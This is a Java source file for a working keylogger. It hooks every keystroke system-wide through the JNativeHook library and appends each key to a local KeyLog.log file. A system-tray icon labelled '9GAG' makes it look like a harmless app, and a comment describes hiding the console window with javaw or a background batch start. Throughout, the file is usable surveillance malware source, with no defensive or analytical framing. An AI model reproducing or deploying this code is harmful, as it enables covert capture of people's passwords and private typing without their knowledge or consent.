package keylogger;

import java.awt.AWTException;
import java.awt.Image;
import java.awt.MenuItem;
import java.awt.PopupMenu;
import java.awt.SystemTray;
import java.awt.TrayIcon;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.ImageIcon;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/*Primero se implementará la interfaz que contiene los métodos necesarios para el
 * manejo de las teclas según su comportamiento
 */
public class KeyLogger implements NativeKeyListener {

    public static void main(String[] args) {

        /**
         * Hide console > start javaw -jar KeyLogger.jar
         * 
         * Or
         * 
         *  try {
                Process p = Runtime.getRuntime().exec("cmd /c start /B example.bat");
                p.waitFor();
            } catch (InterruptedException ex) {
                Logger.getLogger(OpenFileFromCmd.class.getName()).log(Level.SEVERE, null, ex);
            } catch (IOException ex) {
                Logger.getLogger(OpenFileFromCmd.class.getName()).log(Level.SEVERE, null, ex);
            }
         * 
         */
        
        
        if (SystemTray.isSupported()) {
            
            // Yes My System Support System Tray  
            System.out.println("Started");
            
            // Create menu
            PopupMenu menu = new PopupMenu();
            MenuItem closeItem = new MenuItem("Close");
            closeItem.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                    System.exit(0);
                }
            });
            menu.add(closeItem);
            
            // Create SystemTray and TrayIcon (TrayIcon : It is icon that
            // display in SystemTray)
            final SystemTray systemTray = SystemTray.getSystemTray();
            Path root = Paths.get("");
            String path = root.toAbsolutePath().toString() + "\\icon\\9gag.png";
            final TrayIcon trayIcon = new TrayIcon(getImage(path), "9GAG", menu);
            trayIcon.setImageAutoSize(true);// Autosize icon base on space
            // available on
            // tray

            MouseAdapter mouseAdapter = new MouseAdapter() {
                @Override
                public void mouseClicked(MouseEvent e) {
                    // This will display small popup message from System Tray
//                    trayIcon.displayMessage(
//                            "9GAG Logger",
//                            "This is an info message from TrayIcon",
//                            TrayIcon.MessageType.INFO
//                    );
                }
            };

            trayIcon.addMouseListener(mouseAdapter);

            try {
                
                systemTray.add(trayIcon);

                //Se inicia la rutina de inicialización de los componentes de la librería JNativeHook 
                GlobalScreen.registerNativeHook();

            } catch (AWTException | NativeHookException e) {
                
            }

            /*Es necesario decirle a la instancia de GlobalScreen que se agregará un Listener,
             * ya que la clase Main implementa la interfaz del Listener sólo se crea una instancia
             * de dicha clase para colocarla como argumento:
             */
            GlobalScreen.getInstance().addNativeKeyListener(new KeyLogger());

        } else {
            System.out.println("System Not Support System Tray");
        }

    }

    //El método que se utilizará por ahora es nativeKeyPressed:
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        //El código que imprimirá en la salida estándar cuál tecla se ha presionado es: 
        String key = NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r\n";
        try {
            save(key);
        } catch (IOException ex) {
            Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        // TODO Auto-generated method stub

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        // TODO Auto-generated method stub

    }

    public static Image getImage(String path) {
        ImageIcon icon = new ImageIcon(path, "9GAG");
        return icon.getImage();
    }

    public void save(String keyString) throws IOException {
        Path root = Paths.get("");
        File a = new File(root.toAbsolutePath().toString() + "\\KeyLog.log");
        if (!a.exists()) {
            a.createNewFile();
        }
        FileWriter fw = new FileWriter(a.getAbsoluteFile(), true);
        BufferedWriter bw = new BufferedWriter(fw);
        bw.append(keyString);
        bw.close();
    }

}
